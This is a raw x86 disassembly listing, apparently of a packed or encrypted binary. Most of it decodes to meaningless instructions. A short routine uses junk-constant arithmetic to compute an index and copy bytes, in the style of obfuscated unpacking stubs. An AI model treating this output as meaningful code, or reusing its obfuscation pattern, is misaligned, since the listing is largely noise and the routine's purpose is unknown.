  41507a:	xchg   BYTE PTR [esp+edi*4],dh
  41507d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41507e:	lods   al,BYTE PTR ds:[esi]
  41507f:	aad    0xf1
  415081:	loopne 0x4150ac
  415083:	mov    ch,0x3d
  415085:	js     0x4150b5
  415087:	and    bh,BYTE PTR [edx+0x46d94d76]
  41508d:	push   ss
  41508e:	dec    ebp
  41508f:	out    dx,al
  415090:	test   al,0xab
  415092:	adc    eax,0x9e980b7a
  415097:	fs jecxz 0x415032
  41509a:	xchg   ecx,eax
  41509b:	or     dl,ch
  41509d:	add    esi,0xffffffe6
  4150a0:	mov    edx,0x809f7808
  4150a5:	sti    
  4150a6:	(bad)  
  4150a7:	jbe    0x4150af
  4150a9:	or     al,0x99
  4150ab:	sub    eax,0x537a9213
  4150b0:	adc    DWORD PTR [edi+esi*4+0x1cc88d1d],esi
  4150b7:	ja     0x4150f7
  4150b9:	mov    ecx,0x6e28a911
  4150be:	div    BYTE PTR [ecx+0x8795d75]
  4150c4:	pop    eax
  4150c5:	xor    BYTE PTR [edi-0x3b],cl
  4150c8:	dec    ebp
  4150c9:	push   0x2423ce9d
  4150ce:	sar    DWORD PTR [esp+eiz*4+0x5a],1
  4150d2:	xchg   BYTE PTR [ecx+0xc],cl
  4150d5:	inc    edx
  4150d6:	mov    cl,0x15
  4150d8:	or     eax,0x31ddbcf8
  4150dd:	mov    dh,0x1f
  4150df:	sbb    ah,ch
  4150e1:	xor    DWORD PTR [esi-0x14],edx
  4150e4:	sub    eax,0xf49003a7
  4150e9:	mov    BYTE PTR [edi],ch
  4150eb:	mov    eax,ds:0xe87fb1da
  4150f0:	arpl   dx,dx
  4150f2:	jo     0x41515a
  4150f4:	pop    ecx
  4150f5:	sub    DWORD PTR [esi-0x7fa67ec5],0x7f890279
  4150ff:	ret    
  415100:	sub    al,0x20
  415102:	retf   0x5c18
  415105:	repnz inc edi
  415107:	retf   
  415108:	adc    ecx,ebx
  41510a:	stos   DWORD PTR es:[edi],eax
  41510b:	mov    dh,0xc1
  41510d:	jge    0x4150d1
  41510f:	shl    BYTE PTR [ecx],1
  415111:	jecxz  0x41518d
  415113:	imul   esi,ebp,0x2cd7ef64
  415119:	out    0xe2,eax
  41511b:	les    esi,FWORD PTR [ebp-0x4a]
  41511e:	mov    dh,BYTE PTR [esi]
  415120:	in     al,dx
  415121:	sar    DWORD PTR [esp+ebp*8-0x75c8bc06],1
  415128:	stos   DWORD PTR es:[edi],eax
  415129:	rcr    DWORD PTR [ebp-0x45a11634],1
  41512f:	imul   ebx,DWORD PTR [eax-0x3cb0e34],0xe1deb0ae
  415139:	sub    eax,0x744b7b5d
  41513e:	sbb    BYTE PTR [ebp-0x7c],0xa9
  415142:	rcr    BYTE PTR [esi],cl
  415144:	in     eax,0xa2
  415146:	scas   al,BYTE PTR es:[edi]
  415147:	xchg   BYTE PTR [ebp+0x375b2465],cl
  41514d:	dec    ebp
  41514e:	push   ds
  41514f:	jns    0x41517e
  415151:	jae    0x4151ba
  415153:	cwde   
  415154:	stc    
  415155:	push   ebp
  415156:	leave  
  415157:	push   edi
  415158:	or     eax,0xa754e3e9
  41515d:	mov    ebx,0xcd37d646
  415162:	or     eax,0x60028bf5
  415167:	sahf   
  415168:	sbb    eax,0xbc2c34ad
  41516d:	adc    esi,ebx
  41516f:	fmul   DWORD PTR [edi+edi*1]
  415172:	cli    
  415173:	or     ebp,ecx
  415175:	mov    ds:0xb3651152,eax
  41517a:	mov    eax,ds:0x7f2486ec
  41517f:	inc    ebx
  415180:	sub    BYTE PTR [ebx-0x555384ef],ch
  415186:	inc    ecx
  415187:	daa    
  415188:	cwde   
  415189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41518a:	mov    eax,0x487c2c8
  41518f:	mov    edi,DWORD PTR [ebx-0x68]
  415192:	add    BYTE PTR [ebx],bl
  415194:	add    al,0x4d
  415196:	cli    
  415197:	mov    eax,0xb5e214ee
  41519c:	jo     0x415141
  41519e:	lahf   
  41519f:	sub    al,0x76
  4151a1:	push   ebx
  4151a2:	inc    edi
  4151a3:	scas   eax,DWORD PTR es:[edi]
  4151a4:	mul    cl
  4151a6:	stos   DWORD PTR es:[edi],eax
  4151a7:	(bad)
  4151ab:	scas   al,BYTE PTR es:[edi]
  4151ac:	lock sub BYTE PTR [ecx],al
  4151af:	add    DWORD PTR [edi+0x20c2f023],0x57ac5c98
  4151b9:	xchg   edi,eax
  4151ba:	add    dh,0x9b
  4151bd:	push   ss
  4151be:	dec    ecx
  4151bf:	sbb    BYTE PTR [edi-0x66],dh
  4151c2:	inc    esp
  4151c3:	mov    ah,0x95
  4151c5:	mov    dl,0x5
  4151c7:	mov    dh,0xf6
  4151c9:	call   0xb8fc:0xc4b5d2c5
  4151d0:	jg     0x4151e7
  4151d2:	or     DWORD PTR [eax+0x1424548b],ebp
  4151d8:	sub    DWORD PTR [eax],ecx
  4151da:	sbb    DWORD PTR [eax+0x4],edx
  4151dd:	mov    eax,DWORD PTR [esp+0xc]
  4151e1:	or     DWORD PTR [eax],0xca7da575
  4151e7:	or     DWORD PTR [eax+0x4],0x9c1b89e8
  4151ee:	lea    eax,[esp+0x18]
  4151f2:	push   eax
  4151f3:	lea    eax,[esp+0x24]
  4151f7:	push   eax
  4151f8:	call   0x4127df
  4151fd:	mov    eax,DWORD PTR [esp+0x18]
  415201:	mov    ecx,DWORD PTR [esp+0x1c]
  415205:	push   DWORD PTR [ebp+0x18]
  415208:	mov    ebx,DWORD PTR [ebp+0xc]
  41520b:	push   DWORD PTR [ebp+0x14]
  41520e:	mov    esi,DWORD PTR [ebp+0x8]
  415211:	push   DWORD PTR [ebp+0x10]
  415214:	push   DWORD PTR [esp+0x20]
  415218:	push   DWORD PTR [esp+0x20]
  41521c:	push   DWORD PTR [esp+0x38]
  415220:	push   DWORD PTR [esp+0x38]
  415224:	call   0x401000
  415229:	pop    esi
  41522a:	pop    ebx
  41522b:	mov    esp,ebp
  41522d:	pop    ebp
  41522e:	ret    0x14
  415231:	push   ebp
  415232:	mov    ebp,esp
  415234:	sub    esp,0x30
  415237:	mov    DWORD PTR [ebp-0x24],0x7c16
  41523e:	mov    DWORD PTR [ebp-0x20],0x53bd
  415245:	mov    DWORD PTR [ebp-0x18],0x3bd5
  41524c:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  415253:	mov    DWORD PTR [ebp-0xc],0x4b9d
  41525a:	mov    DWORD PTR [ebp-0x8],0x7e48
  415261:	mov    DWORD PTR [ebp-0x4],0x604b
  415268:	mov    DWORD PTR [ebp-0x30],0x5b69
  41526f:	mov    DWORD PTR [ebp-0x2c],0x4521
  415276:	mov    DWORD PTR [ebp-0x28],0x2979
  41527d:	mov    DWORD PTR [ebp-0x14],0x9e8
  415284:	mov    DWORD PTR [ebp-0x10],0x40e5
  41528b:	mov    ecx,DWORD PTR [ebp-0x4]
  41528e:	mov    eax,DWORD PTR [ebp-0x8]
  415291:	add    ecx,0x1d04
  415297:	xor    ecx,eax
  415299:	mov    eax,DWORD PTR [ebp-0xc]
  41529c:	and    ecx,0x6f79
  4152a2:	imul   ecx,eax
  4152a5:	xor    ecx,0xe33ab1
  4152ab:	push   esi
  4152ac:	mov    DWORD PTR [ebp-0x4],0x5989
  4152b3:	mov    DWORD PTR [ebp-0x8],0x402c1
  4152ba:	mov    DWORD PTR [ebp-0xc],0x4114
  4152c1:	mov    eax,DWORD PTR [ebp-0xc]
  4152c4:	mov    esi,DWORD PTR [ebp-0x8]
  4152c7:	xor    edx,edx
  4152c9:	sub    eax,0x6cb6
  4152ce:	div    esi
  4152d0:	mov    edx,DWORD PTR [ebp-0x4]
  4152d3:	mov    esi,DWORD PTR [ebp+0xc]
  4152d6:	or     eax,edx
  4152d8:	xor    eax,0x67f1
  4152dd:	mov    edx,ecx
  4152df:	sub    edx,eax
  4152e1:	mov    DWORD PTR [ebp-0x4],edx
  4152e4:	mov    eax,DWORD PTR [ebp-0x4]
  4152e7:	mov    edx,DWORD PTR [ebp-0x4]
  4152ea:	mov    dl,BYTE PTR [edx+esi*1]
  4152ed:	mov    esi,DWORD PTR [ebp+0x8]
  4152f0:	mov    BYTE PTR [eax+esi*1],dl
  4152f3:	jmp    0x415646
  4152f8:	mov    cl,0x4a
  4152fa:	aas    
  4152fb:	(bad)  
  4152fc:	sbb    bh,BYTE PTR [edx-0x5f]
  4152ff:	sub    dh,BYTE PTR [esi+0x117e1b8c]
  415305:	leave  
  415306:	lds    edi,FWORD PTR [esp+edi*4+0xe]
  41530a:	push   ss
  41530b:	sbb    BYTE PTR [ebp-0x61e7e7ee],dh
  415311:	mov    eax,ds:0x3307e0bc
  415316:	jge    0x415329
  415318:	js     0x4152d7
  41531a:	arpl   WORD PTR [esi-0x33],di
  41531d:	lea    ebx,[edx]
  41531f:	inc    ecx
  415320:	dec    esi
  415321:	xchg   ebp,eax
  415322:	inc    ecx
  415323:	ror    edi,1
  415325:	in     al,0x8d
  415327:	mov    dh,0xde
  415329:	loop   0x41538d
  41532b:	sahf   
  41532c:	sub    al,0xdd
  41532e:	cmp    eax,0x84b5745c
  415333:	outs   dx,BYTE PTR ds:[esi]
  415334:	sub    dh,BYTE PTR [esi+0x56]
  415337:	ret    
  415338:	jl     0x41531a
  41533a:	or     eax,0x637642c7
  41533f:	inc    edi
  415340:	(bad)  
  415341:	dec    edi
  415342:	rcr    edx,1
  415344:	imul   ebx,DWORD PTR [ebp+0x450962fc],0x881a91bc
  41534e:	cmp    al,BYTE PTR [esi]
  415350:	xlat   BYTE PTR ds:[ebx]
  415351:	mov    al,ds:0x2b6846dd
  415356:	int    0x1c
  415358:	jno    0x415375
  41535a:	mov    esi,0x6484583d
  41535f:	jo     0x41537a
  415361:	pop    ds
  415362:	js     0x415332
  415364:	cmp    dh,dl
  415366:	jnp    0x4153a0
  415368:	mov    ds:0x190b4283,eax
  41536d:	test   DWORD PTR [ebx],esi
  41536f:	lea    ebp,[ecx-0x43]
  415372:	inc    ecx
  415373:	and    al,0xb8
  415375:	inc    esi
  415376:	(bad)  
  415377:	lock out 0x82,al
  41537a:	jbe    0x41537a
  41537c:	adc    DWORD PTR [ebx+0x82332e0],0xffffffa7
  415383:	jnp    0x415331
  415385:	mov    edi,ebx
  415387:	cdq    
  415388:	aad    0xb4
  41538a:	ror    BYTE PTR [esp+edx*2],1
  41538d:	sub    BYTE PTR es:[eax],bh
  415390:	push   esp
  415391:	push   ebx
  415392:	repz cld 
  415394:	inc    edx
  415395:	fnclex 
  415397:	ss cmp eax,0x7d978353
  41539d:	rcr    DWORD PTR [edi],0x79
  4153a0:	bound  edx,QWORD PTR [edi-0x654937f]
  4153a6:	and    al,BYTE PTR [esi-0x55]
  4153a9:	push   ebx
  4153aa:	sbb    ebx,ebp
  4153ac:	or     eax,esi
  4153ae:	ficom  WORD PTR [eax-0x40c63da3]
  4153b4:	xor    eax,0xf8440008
  4153b9:	mov    cl,0x51
  4153bb:	sahf   
  4153bc:	and    DWORD PTR [esi-0x5a],edi
  4153bf:	rcr    BYTE PTR [esi],cl
  4153c1:	mov    dh,0x20
  4153c3:	(bad)  
  4153c4:	push   ss
  4153c5:	and    edi,DWORD PTR [ecx+ebp*2-0x34]
  4153c9:	jl     0x4153cd
  4153cb:	dec    ebx
  4153cc:	loop   0x41540c
  4153ce:	adc    DWORD PTR [esi],ebp
  4153d0:	pop    esi
  4153d1:	repnz adc bl,bh
  4153d4:	xor    BYTE PTR [edi*2-0x17e0986b],0x7f
  4153dc:	or     cl,ch
  4153de:	jbe    0x415458
  4153e0:	ja     0x4153c6
  4153e2:	popf   
  4153e3:	out    0x1e,eax
  4153e5:	int3   
  4153e6:	dec    esi
  4153e7:	sbb    al,0xfb
  4153e9:	adc    al,0x83
  4153eb:	sub    BYTE PTR [eax],bl
  4153ed:	xchg   edi,eax
  4153ee:	fsub   QWORD PTR [edx-0x471ebb10]
  4153f4:	stc    
  4153f5:	test   al,0x3b
  4153f7:	leave  
  4153f8:	cmp    esi,DWORD PTR ds:0xb02b59bc
  4153fe:	xchg   ebx,eax
  4153ff:	stc    
  415400:	dec    ebx
  415401:	pop    esp
  415402:	mov    ecx,0x129e0f96
  415407:	fcomp  QWORD PTR [edx]
  415409:	(bad)  
  41540a:	mov    dl,0x3c
  41540c:	dec    esi
  41540d:	imul   esp,eax,0x5e0d309c
  415413:	daa    
  415414:	xor    DWORD PTR [edi+0x2ac76252],0xf7d032fb
  41541e:	pop    esp
  41541f:	or     BYTE PTR [edx-0x250366fb],ah
  415425:	push   esi
  415426:	or     ebx,DWORD PTR [edi-0x3e]
  415429:	(bad)  
  41542a:	sbb    ecx,DWORD PTR [edi-0x5d0c0b80]
  415430:	and    eax,0x27a2d1c9
  415435:	dec    ebx
  415436:	pop    ebp
  415437:	or     al,0x23
  415439:	fistp  DWORD PTR [ebp+edi*8+0x78bb26c8]
  415440:	xor    eax,0x173c3bde
  415445:	cmp    al,0x13
  415447:	or     ecx,DWORD PTR [ebx-0x4c]
  41544a:	mov    esp,0x2ed7d204
  41544f:	lods   eax,DWORD PTR ds:[esi]
  415450:	push   cs
  415451:	test   eax,0x59853b00
  415456:	push   edi
  415457:	push   edx
  415458:	out    dx,al
  415459:	adc    BYTE PTR [ebx],ah
  41545b:	jns    0x4154c3
  41545d:	sbb    BYTE PTR [ebx+esi*2],bl
  415460:	add    al,0xb5
  415462:	rol    ebp,cl
  415464:	cmp    bh,dh
  415466:	jb     0x415426
  415468:	inc    edi
  415469:	cmp    eax,0xb0f27f6f
  41546e:	inc    esi
  41546f:	xor    esp,DWORD PTR [ebx]
  415471:	push   cs
  415472:	pop    edx
  415473:	dec    BYTE PTR [edi+edx*4-0x34]
  415477:	lods   al,BYTE PTR ds:[esi]
  415478:	dec    ecx
  415479:	sub    eax,0xc9e7cf5c
  41547e:	ja     0x4154bf
  415480:	ja     0x415487
  415482:	push   ebp
  415483:	js     0x41544c
  415485:	loop   0x4154f5
  415487:	repnz call 0xb2e6:0x196aef1f
  41548f:	xor    BYTE PTR [esi+esi*1],0xa1
  415493:	cmp    al,0x3f
  415495:	inc    edx
  415496:	ret    
  415497:	mov    al,ds:0x58e616b3
  41549c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41549d:	jnp    0x4154bb
  41549f:	xor    DWORD PTR [ebp-0x6447248a],eax
  4154a5:	jno    0x415522
  4154a7:	nop
  4154a8:	repnz shr DWORD PTR [esi+eax*8+0x12],cl
  4154ad:	shr    DWORD PTR [edi-0x5c],0xf6
  4154b1:	or     edi,DWORD PTR [ebx+0x4b]
  4154b4:	adc    al,0xbe
  4154b6:	push   ebp
  4154b7:	pop    es
  4154b8:	xor    bl,BYTE PTR [edx+0x378358c5]
  4154be:	mov    al,0x38
  4154c0:	jmp    0x4154ba
  4154c2:	push   esi
  4154c3:	inc    eax
  4154c4:	push   ss
  4154c5:	cmp    eax,0x6a9d5581
  4154ca:	xor    DWORD PTR [ecx+0x2cbf9e39],edi
  4154d0:	mov    edi,0xdf00f281
  4154d5:	(bad)  
  4154d6:	call   0x2150aaea
  4154db:	jne    0x415543
  4154dd:	xor    al,0x8d
  4154df:	jnp    0x415521
  4154e1:	inc    esp
  4154e2:	je     0x41552e
  4154e4:	loop   0x41552d
  4154e6:	jae    0x415544
  4154e8:	dec    edi
  4154e9:	loop   0x4154c6
  4154eb:	xchg   DWORD PTR [ebx+0x303a6e8e],ebx
  4154f1:	aas    
  4154f2:	xor    esp,DWORD PTR [ecx+eiz*1-0x8]
  4154f6:	or     eax,0x8e7ed45
  4154fb:	sbb    eax,0x88ea84fa
  415500:	in     eax,dx
  415501:	mov    ds:0x2a213124,eax
  415506:	aad    0x43
  415508:	mov    eax,0xbe8cae8a
  41550d:	ret    0x8ad6
  415510:	adc    DWORD PTR [ecx],eax
  415512:	pop    eax
  415513:	xchg   DWORD PTR [ecx+0x4640a9f8],ebp
  415519:	sbb    BYTE PTR [ebx+0xb],ah
  41551c:	xchg   edi,eax
  41551d:	cmp    ecx,DWORD PTR [edx+0x2fc4deb]
  415523:	lea    ebx,[eax-0x7cbd41be]
  415529:	stos   BYTE PTR es:[edi],al
  41552a:	push   ecx
  41552b:	outs   dx,BYTE PTR ds:[esi]
  41552c:	out    dx,al
  41552d:	popa   
  41552e:	icebp  
  41552f:	aam    0xf6
  415531:	retf   
  415532:	jg     0x4154cf
  415534:	(bad)  
  415536:	ds (bad) 
  415538:	or     al,0x71
  41553a:	cmp    edi,DWORD PTR [ebx+0x68323848]
  415540:	cmp    al,bl
  415542:	mov    ebp,0x4dcadf9a
  415547:	jg     0x415523
  415549:	xor    bh,BYTE PTR [ebx+0x4092eaf0]
  41554f:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  415551:	inc    esp
  415552:	in     eax,dx
  415553:	dec    ebp
  415554:	in     al,0x3
  415556:	mov    edx,0xb540ed74
  41555b:	xchg   ebp,eax
  41555c:	pop    es
  41555d:	out    dx,eax
  41555e:	lds    ecx,FWORD PTR [ecx]
  415560:	(bad)  
  415561:	sbb    eax,0xe0eef999
  415566:	add    eax,0x539c809a
  41556b:	mov    edi,0x6a8a1108
  415570:	(bad)  
  415571:	xor    edi,edi
  415573:	mov    esp,0xb38cc362
  415578:	leave  
  415579:	dec    edi
  41557a:	add    DWORD PTR [ebx-0x54],esp
  41557d:	mov    bh,0xf4
  41557f:	jl     0x4155e3
  415581:	adc    BYTE PTR [esi+0x2ad57f39],dh
  415587:	sub    ebx,esi
  415589:	ja     0x4155a8
  41558b:	aad    0xa0
  41558d:	fwait
  41558e:	jb     0x4155f1
  415590:	adc    BYTE PTR [esp+edi*1-0x3143132d],dl
  415597:	les    ecx,FWORD PTR [eax]
  415599:	adc    eax,0x107f0bc3
  41559e:	lock (bad) 
  4155a0:	sahf   
  4155a1:	mov    esp,0xbe830ddd
  4155a6:	fimul  DWORD PTR [ecx+0x56]
  4155a9:	or     al,0xce
  4155ab:	mov    fs,WORD PTR [eax+0x14]
  4155ae:	int3   
  4155af:	int    0x6d
  4155b1:	push   edx
  4155b2:	mov    ch,0x87
  4155b4:	pop    ebp
  4155b5:	mov    edx,ebp
  4155b7:	aas    
  4155b8:	sub    cl,bl
  4155ba:	sbb    BYTE PTR [ebx+0x2bd056c9],bh
  4155c0:	fcmovne st,st(6)
  4155c2:	test   BYTE PTR [ecx+0x6dad4653],cl
  4155c8:	and    DWORD PTR ds:0x711a0aa3,0x65
  4155cf:	fistp  QWORD PTR [esi+0xc1b4578]
  4155d5:	adc    al,0x66
  4155d7:	and    BYTE PTR [esi+0x7f42a8a0],ah
  4155dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155de:	mov    cl,bl
  4155e0:	inc    esp
  4155e1:	add    ah,BYTE PTR [edi-0x16]
  4155e4:	cmc    
  4155e5:	pop    edi
  4155e6:	xchg   ebx,eax
  4155e7:	rol    DWORD PTR [ecx+0x56e0c7e1],cl
  4155ed:	ins    BYTE PTR es:[edi],dx
  4155ee:	ins    DWORD PTR es:[edi],dx
  4155ef:	mov    eax,0xc4afe37f
  4155f4:	sti    
  4155f5:	sti    
  4155f6:	repz cmp esp,DWORD PTR [esi+edx*4]
  4155fa:	lock adc al,0xc2
  4155fd:	cmovb  eax,DWORD PTR [edx+0x46]
  415601:	push   0x29
  415603:	sar    BYTE PTR [esp+edi*8+0x387bef53],0xf2
  41560b:	mov    cl,0x73
  41560d:	in     eax,0xaa
  41560f:	pop    ecx
  415610:	jle    0x415676
  415612:	(bad)  
  415613:	into   
  415614:	ins    DWORD PTR es:[edi],dx
  415615:	or     DWORD PTR [edx-0x15],ebp
  415618:	stos   BYTE PTR es:[edi],al
  415619:	dec    edx
  41561a:	jp     0x4155b9
  41561c:	sar    DWORD PTR [ecx+eiz*1],0xa9
  415620:	pop    ebx
  415621:	and    esp,ebp
  415623:	jle    0x4155e0
  415625:	mov    ebp,0x7faf252b
  41562a:	sub    al,0x9f
  41562c:	bound  eax,QWORD PTR ds:0x3f20ba84
  415632:	pop    edx
  415633:	and    ebx,DWORD PTR [edx-0x77]
  415636:	xor    BYTE PTR [esp+edx*8+0x8],dh
  41563a:	dec    edi
  41563b:	repz fsubr QWORD PTR [eax-0x59]
  41563f:	(bad)  
  415640:	in     eax,0xaa
  415642:	pop    eax
  415643:	gs call 0x558b:0xf0458b7d
  41564b:	in     al,dx
  41564c:	imul   eax,eax,0x43bd290
  415652:	and    eax,edx
  415654:	or     eax,0x1a40
  415659:	xor    eax,0x1ac1
  41565e:	add    ecx,eax
  415660:	mov    eax,DWORD PTR [ebp-0x18]
  415663:	mov    edx,0x7380
  415668:	sub    edx,eax
  41566a:	add    edx,DWORD PTR [ebp-0x1c]
  41566d:	jmp    0x4159c0
  415672:	pop    esp
  415673:	pushf  
  415674:	lds    eax,FWORD PTR [ebp+eax*2+0x1c]
  415678:	pop    esp
  415679:	pushf  
  41567a:	push   ss
  41567b:	cwde   
  41567c:	pop    ebx
  41567d:	jo     0x415668
  41567f:	pusha  
  415680:	stos   DWORD PTR es:[edi],eax
  415681:	mov    al,0x58
  415683:	or     BYTE PTR [esi],dl
  415685:	sbb    BYTE PTR [ebp-0x7fe7e7ee],dh
  41568b:	cmp    al,0x66
  41568d:	xor    DWORD PTR [esi+edx*4],eax
  415690:	sbb    BYTE PTR [ebp-0x13],dl
  415693:	cmp    ebx,ebx
  415695:	mov    DWORD PTR [eax+0x7],edi
  415698:	clc    
  415699:	mov    esi,0x775a3a0f
  41569e:	outs   dx,BYTE PTR ds:[esi]
  41569f:	dec    ecx
  4156a0:	repz adc DWORD PTR [edi+0x2e0f3f7f],0xffffff90
  4156a8:	add    edi,DWORD PTR [eax-0x16]
  4156ab:	test   eax,0xc2d82074
  4156b0:	sti    
  4156b1:	addr16 out dx,al
  4156b3:	call   0x72851d17
  4156b8:	pop    esp
  4156b9:	mov    al,BYTE PTR [ebx]
  4156bb:	xchg   ebx,eax
  4156bc:	pop    ss
  4156bd:	jg     0x4156bf
  4156bf:	pop    es
  4156c0:	cmp    DWORD PTR [esi+0x35],ecx
  4156c3:	or     ebp,0xffffffab
  4156c6:	lods   eax,DWORD PTR ds:[esi]
  4156c7:	mov    al,ds:0x36c88d75
  4156cc:	xor    DWORD PTR [edi+0x17],eax
  4156cf:	cld    
  4156d0:	iret   
  4156d1:	repnz push 0xfffffff4
  4156d4:	pop    es
  4156d5:	mov    ?,esp
  4156d7:	mov    esi,0xeba4f411
  4156dc:	or     DWORD PTR ds:0x3f8a81f,0xa1666527
  4156e6:	push   esp
  4156e7:	stc    
  4156e8:	lahf   
  4156e9:	or     BYTE PTR [edx],0xdd
  4156ec:	xchg   DWORD PTR [esp+ebp*2+0x75620c7f],ebx
  4156f3:	cmp    eax,0x6fa803b1
  4156f8:	cmp    cl,BYTE PTR [edi]
  4156fa:	mov    edx,0x9340611a
  4156ff:	sar    BYTE PTR [bp-0x20cd],1
  415704:	jns    0x4156dd
  415706:	pop    ss
  415707:	or     al,0x77
  415709:	or     BYTE PTR [eax+0x67b1564f],dl
  41570f:	imul   eax,DWORD PTR [esi+0x568e9d57],0x4c7de14a
  415719:	mov    dh,0x99
  41571b:	add    DWORD PTR [edi-0xc],edi
  41571e:	cli    
  41571f:	fsub   DWORD PTR [ebx-0x3e]
  415722:	fwait
  415723:	test   eax,0xaf397ed9
  415728:	pop    ecx
  415729:	pusha  
  41572a:	jo     0x415773
  41572c:	sub    esp,DWORD PTR ds:0x941454b7
  415732:	scas   eax,DWORD PTR es:[edi]
  415733:	inc    eax
  415734:	mov    al,BYTE PTR [eax+0x71]
  415737:	(bad)  
  415738:	fild   DWORD PTR [eax+0x6b491d25]
  41573e:	cli    
  41573f:	hlt    
  415740:	xor    eax,0x58aa2566
  415745:	enter  0xae23,0x83
  415749:	add    dl,BYTE PTR [edi+0x712f73ba]
  41574f:	test   al,0x5
  415751:	mov    ebp,0x265b88e
  415756:	cmc    
  415757:	out    dx,al
  415758:	sar    dh,1
  41575a:	pop    ds
  41575b:	aam    0xc3
  41575d:	jmp    0x9c305b2a
  415762:	loop   0x415762
  415764:	dec    ebp
  415765:	and    ecx,eax
  415767:	int3   
  415768:	xor    bl,BYTE PTR [esi]
  41576a:	aam    0x48
  41576c:	out    dx,eax
  41576d:	ja     0x415791
  41576f:	in     al,dx
  415770:	jmp    0x627a:0xf8523d4d
  415777:	ret    0x1996
  41577a:	mov    BYTE PTR [ebx-0x326dd217],0x2e
  415781:	sub    eax,0x90c6c4e0
  415786:	stc    
  415787:	shl    BYTE PTR [ebx-0x15ce14ed],cl
  41578d:	or     ah,ah
  41578f:	jo     0x4157d1
  415791:	xor    dl,dh
  415793:	(bad)  
  415794:	sub    esi,DWORD PTR [ebx-0x75]
  415797:	out    dx,eax
  415798:	xchg   BYTE PTR [ebx+0x3da60eb4],cl
  41579e:	mov    ds:0x7b884a80,al
  4157a3:	sub    ebp,ebp
  4157a5:	test   eax,0xe2a3183b
  4157aa:	sub    BYTE PTR [edi+ebx*8-0x6864ad0b],0xab
  4157b2:	cs cmp al,bl
  4157b5:	out    dx,eax
  4157b6:	std    
  4157b7:	mov    ch,bl
  4157b9:	fpatan 
  4157bb:	cmp    eax,0x1ebf26ed
  4157c0:	aas    
  4157c1:	sub    DWORD PTR [edi-0x51a8876a],eax
  4157c7:	push   esp
  4157c8:	xchg   ebp,eax
  4157c9:	or     eax,DWORD PTR [eax+0x69]
  4157cc:	and    eax,0x61f79121
  4157d1:	retf   
  4157d2:	add    BYTE PTR [ecx],al
  4157d4:	push   cs
  4157d5:	dec    ebp
  4157d6:	pop    ebp
  4157d7:	je     0x4157d0
  4157d9:	cld    
  4157da:	fiadd  WORD PTR [edi]
  4157dc:	stos   BYTE PTR es:[edi],al
  4157dd:	jnp    0x41582e
  4157df:	(bad)  
  4157e0:	fldenv [esi]
  4157e2:	or     eax,esp
  4157e4:	push   ds
  4157e5:	mov    dl,0xb9
  4157e7:	jbe    0x4157c7
  4157e9:	in     eax,dx
  4157ea:	inc    ebx
  4157eb:	les    ecx,FWORD PTR [ecx+0x7a33e9fb]
  4157f1:	rol    DWORD PTR [esi],cl
  4157f3:	fist   WORD PTR [ecx-0x44]
  4157f6:	call   0xe131c1bd
  4157fb:	pop    ss
  4157fc:	dec    edi
  4157fd:	mov    ebp,0x3aa6d271
  415802:	call   0xa063:0xe8353ffd
  415809:	shl    ch,cl
  41580b:	sti    
  41580c:	mov    dl,0x9a
  41580e:	jb     0x415798
  415810:	ret    0x968a
  415813:	mul    esp
  415815:	dec    ebp
  415816:	pop    esi
  415817:	popf   
  415818:	xchg   esi,eax
  415819:	das    
  41581a:	ffree  st(4)
  41581c:	sbb    ebx,ebx
  41581e:	push   esp
  415820:	inc    esi
  415821:	das    
  415822:	push   es
  415823:	jnp    0x415869
  415825:	push   ss
  415826:	jg     0x41588d
  415828:	mul    DWORD PTR [edx]
  41582a:	cmp    eax,0x1e4bd8e5
  41582f:	test   eax,0xa42799e1
  415834:	and    BYTE PTR [ecx],ch
  415836:	sbb    eax,0x4cd8447f
  41583b:	xor    eax,0x1e0c8ea5
  415840:	hlt    
  415841:	sub    eax,0xb3841e79
  415846:	call   0x702d6bf3
  41584b:	movd   DWORD PTR [ebp+0xb],mm7
  41584f:	shr    BYTE PTR [ebx+0x57],0xba
  415853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415854:	jecxz  0x41580e
  415856:	pop    eax
  415857:	pop    esi
  415858:	lods   eax,DWORD PTR ds:[esi]
  415859:	lock sub eax,eax
  41585c:	add    al,0x60
  41585e:	imul   esp,DWORD PTR [ecx+ecx*2+0x11],0x5571028f
  415866:	or     BYTE PTR ds:[ecx-0x6822c06f],0xb7
  41586e:	and    edx,DWORD PTR [edx+0x3f2e7017]
  415874:	add    eax,0x356ddb44
  415879:	sub    ecx,DWORD PTR [ebx-0x50]
  41587c:	test   DWORD PTR gs:[ebx-0x7ccee2f4],ebx
  415883:	pop    ecx
  415884:	repz or DWORD PTR [esp+ebp*4],edi
  415888:	inc    ebp
  415889:	test   eax,0xf0f95dde
  41588e:	mov    ds:0x2e94a8be,al
  415893:	sti    
  415894:	jbe    0x4158d2
  415896:	push   es
  415897:	push   cs
  415898:	pop    ebx
  415899:	movsx  esp,BYTE PTR [edx+0x51]
  41589d:	mov    al,0x65
  41589f:	mov    BYTE PTR [eax],dh
  4158a1:	bswap  edi
  4158a3:	or     al,0x85
  4158a5:	mov    edi,0x7affb854
  4158aa:	aas    
  4158ab:	ja     0x41591d
  4158ad:	xchg   BYTE PTR [eax-0x39d07572],ah
  4158b3:	stos   BYTE PTR es:[edi],al
  4158b4:	popa   
  4158b5:	enter  0x378e,0x5d
  4158b9:	ror    DWORD PTR [ebx-0x1c],0x54
  4158bd:	lahf   
  4158be:	xor    eax,0x95ebd8ad
  4158c3:	in     eax,dx
  4158c4:	ins    BYTE PTR es:[edi],dx
  4158c5:	jp     0x41584f
  4158c7:	call   0x4ad0:0x4580f879
  4158ce:	mov    eax,0xce8f216e
  4158d3:	push   edx
  4158d4:	call   0x9ea1:0x7d80ba21
  4158db:	mov    ds:0xdc283dce,al
  4158e0:	ins    DWORD PTR es:[edi],dx
  4158e1:	jge    0x415892
  4158e3:	fldcw  WORD PTR [esi+0x32]
  4158e6:	out    0xde,al
  4158e8:	cdq    
  4158e9:	add    al,0x25
  4158eb:	xor    DWORD PTR [esi+0x5a],edi
  4158ee:	jp     0x4158ec
  4158f0:	mov    DWORD PTR ds:0xd93405db,edi
  4158f6:	dec    ecx
  4158f7:	adc    ch,0xa6
  4158fa:	add    BYTE PTR [ecx-0x77],ch
